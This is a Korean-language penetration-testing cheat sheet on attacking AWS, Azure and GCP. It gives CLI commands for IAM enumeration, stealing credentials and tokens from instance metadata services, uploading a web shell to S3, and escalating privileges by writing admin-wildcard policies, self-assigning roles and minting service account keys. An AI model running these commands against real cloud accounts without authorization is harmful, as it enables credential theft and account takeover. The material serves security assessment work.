# Cloud 공격

AWS / Azure / GCP 환경에서의 열거 · 권한 상승 · 탈취 기법.

온프레미스 AD 가 "사용자 → 그룹 → 권한" 구조라면, 클라우드는 "IAM principal → role → policy" 에서 대부분의 시나리오가 나온다. 메타데이터 · IAM · public bucket · 재사용된 credential 이 그 녔각.

---

## AWS

### 초기 정보 수집

```bash
# AWS CLI 설정 확인
aws sts get-caller-identity
aws iam get-user

# 현재 권한 열거
aws iam list-attached-user-policies --user-name <user>
aws iam list-user-policies --user-name <user>
aws iam list-groups-for-user --user-name <user>

# 계정 내 사용자/역할 목록
aws iam list-users
aws iam list-roles
```

### IAM 열거

```bash
# 정책 세부 내용 확인
aws iam get-policy-version --policy-arn <arn> --version-id <v>

# 인라인 정책 확인
aws iam get-user-policy --user-name <user> --policy-name <policy>

# 역할에 연결된 정책
aws iam list-attached-role-policies --role-name <role>
aws iam list-role-policies --role-name <role>

# 자동 열거 도구 - enumerate-iam
python3 enumerate-iam.py --access-key <AKIA...> --secret-key <secret>
```

### EC2 Metadata

```bash
# IMDSv1 (SSRF로 접근 가능)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>

# 획득한 credential로 CLI 설정
export AWS_ACCESS_KEY_ID=<key>
export AWS_SECRET_ACCESS_KEY=<secret>
export AWS_SESSION_TOKEN=<token>

# IMDSv2 (token 필요)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/
```

### S3 Bucket

```bash
# 버킷 목록
aws s3 ls
aws s3 ls s3://<bucket>

# 익명 접근 확인
aws s3 ls s3://<bucket> --no-sign-request

# 파일 다운로드/업로드
aws s3 cp s3://<bucket>/<key> ./
aws s3 cp ./shell.php s3://<bucket>/

# 버킷 정책 확인
aws s3api get-bucket-policy --bucket <bucket>
aws s3api get-bucket-acl --bucket <bucket>
```

### Lambda

```bash
# Lambda 함수 목록
aws lambda list-functions

# 함수 코드 다운로드
aws lambda get-function --function-name <func>

# 함수 환경변수 확인 (credential/API key 노출 가능)
aws lambda get-function-configuration --function-name <func> | jq '.Environment'

# 함수 정책 확인
aws lambda get-policy --function-name <func>
```

### 권한 상승

```bash
# IAM 정책 버전 변경 (iam:SetDefaultPolicyVersion)
# 이전 버전에 더 많은 권한이 있을 수 있음
aws iam list-policy-versions --policy-arn <arn>
aws iam set-default-policy-version --policy-arn <arn> --version-id v1

# 새 정책 버전 생성 (iam:CreatePolicyVersion)
aws iam create-policy-version --policy-arn <arn> \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default

# Lambda를 이용한 권한 상승 (lambda:UpdateFunctionCode + iam:PassRole)
# Lambda에 admin 역할 연결 후 코드 수정하여 권한 있는 작업 수행

# EC2 인스턴스에 역할 연결 (iam:PassRole + ec2:RunInstances)
# admin 역할의 인스턴스 프로파일로 EC2 실행
```

### 자동화 도구

| 도구 | 용도 |
|------|------|
| [pacu](https://github.com/RhinoSecurityLabs/pacu) | AWS 공격 프레임워크 |
| [enumerate-iam](https://github.com/andresriancho/enumerate-iam) | IAM 권한 열거 |
| [ScoutSuite](https://github.com/nccgroup/ScoutSuite) | 클라우드 보안 감사 |
| [Prowler](https://github.com/prowler-cloud/prowler) | AWS 보안 점검 |

---

## Azure / Entra ID

### 초기 정보 수집

```bash
# Azure CLI 로그인 확인
az account show
az account list

# 현재 사용자 정보
az ad signed-in-user show

# 테넌트 정보
az account tenant list
```

### Entra ID (Azure AD) 열거

```bash
# 사용자 목록
az ad user list --output table
az ad user list --query "[].{Name:displayName,UPN:userPrincipalName,ID:id}" --output table

# 그룹 목록
az ad group list --output table

# 그룹 멤버 확인
az ad group member list --group "<group>" --output table

# 앱 등록 정보
az ad app list --output table
az ad app list --query "[].{Name:displayName,AppId:appId}" --output table

# 서비스 프린시폴
az ad sp list --all --output table
```

### 리소스 열거

```bash
# 구독 내 리소스 그룹
az group list --output table

# 리소스 목록
az resource list --output table

# VM 목록
az vm list --output table
az vm list -d --output table    # 상세 정보 (IP 포함)

# Storage Account
az storage account list --output table

# Key Vault
az keyvault list --output table
```

### Storage Account

```bash
# 스토리지 키 확인
az storage account keys list --account-name <account>

# Blob 컨테이너 목록
az storage container list --account-name <account> --account-key <key> --output table

# Blob 목록 / 다운로드
az storage blob list --container-name <container> --account-name <account> --account-key <key> --output table
az storage blob download --container-name <container> --name <blob> --file ./<output> \
  --account-name <account> --account-key <key>

# 익명 접근 확인
curl https://<account>.blob.core.windows.net/<container>/<blob>
```

### Key Vault

```bash
# 시크릿 목록
az keyvault secret list --vault-name <vault> --output table

# 시크릿 값 확인
az keyvault secret show --vault-name <vault> --name <secret>
```

### 권한 상승

```bash
# 역할 할당 확인
az role assignment list --all --output table

# 구독 수준 Owner 확인
az role assignment list --role "Owner" --output table

# 자신에게 역할 할당 (Microsoft.Authorization/roleAssignments/write 필요)
az role assignment create --assignee <user_id> --role "Contributor" \
  --scope "/subscriptions/<sub_id>"

# VM에 관리 ID 할당 후 token 획득
# VM 내부에서:
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

### 자동화 도구

| 도구 | 용도 |
|------|------|
| [ROADtools](https://github.com/dirkjanm/ROADtools) | Azure AD 열거 |
| [AzureHound](https://github.com/BloodHoundAD/AzureHound) | Azure 공격 경로 분석 |
| [MicroBurst](https://github.com/NetSPI/MicroBurst) | Azure 보안 감사 |
| [ScoutSuite](https://github.com/nccgroup/ScoutSuite) | 멀티 클라우드 보안 감사 |
| [GraphRunner](https://github.com/dafthack/GraphRunner) | Microsoft Graph API 공격 |

---

## GCP (Google Cloud Platform)

### 초기 열거

```bash
# gcloud CLI 인증 (서비스 계정 키)
gcloud auth activate-service-account --key-file=key.json

# 프로젝트 목록
gcloud projects list

# 현재 프로젝트 설정
gcloud config set project PROJECT_ID

# IAM 정책 확인
gcloud projects get-iam-policy PROJECT_ID

# 서비스 계정 목록
gcloud iam service-accounts list

# 서비스 계정 키 목록
gcloud iam service-accounts keys list --iam-account=SA_EMAIL
```

### Compute Engine

```bash
# VM 인스턴스 목록
gcloud compute instances list

# VM 메타데이터 (인스턴스 내부에서)
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/project/

# 서비스 계정 token 획득 (인스턴스 내부)
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# SSH 접근
gcloud compute ssh INSTANCE_NAME --zone ZONE

# 시리얼 포트 출력 (비밀번호/키 유출 가능)
gcloud compute instances get-serial-port-output INSTANCE_NAME --zone ZONE
```

### Cloud Storage

```bash
# 버킷 목록
gsutil ls

# 버킷 내용 열거
gsutil ls -r gs://BUCKET_NAME/

# 버킷 권한 확인
gsutil iam get gs://BUCKET_NAME/

# 공개 접근 확인
curl https://storage.googleapis.com/BUCKET_NAME/

# 파일 다운로드
gsutil cp gs://BUCKET_NAME/secret.txt ./
```

### 권한 상승

```bash
# 할당 가능한 역할 확인
gcloud iam roles list --project PROJECT_ID

# 커스텀 역할에 권한 추가 (iam.roles.update 필요)
gcloud iam roles update ROLE_ID --project PROJECT_ID \
  --add-permissions=iam.serviceAccountKeys.create

# 서비스 계정 키 생성 (iam.serviceAccountKeys.create 필요)
gcloud iam service-accounts keys create key.json \
  --iam-account=SA_EMAIL

# 서비스 계정 impersonation (iam.serviceAccounts.getAccessToken)
gcloud auth print-access-token --impersonate-service-account=SA_EMAIL
```

### GCP 자동화 도구

| 도구 | 용도 |
|------|------|
| [GCPBucketBrute](https://github.com/RhinoSecurityLabs/GCPBucketBrute) | GCS 버킷 열거 |
| [ScoutSuite](https://github.com/nccgroup/ScoutSuite) | 멀티 클라우드 감사 |
| [Hayat](https://github.com/AidenPearce369/GCP-Pentesting) | GCP 펜테스팅 |
| [gcp_enum](https://gitlab.com/gitlab-com/gl-security/threatmanagement/redteam/redteam-public/gcp_enum) | GCP 열거 스크립트 |
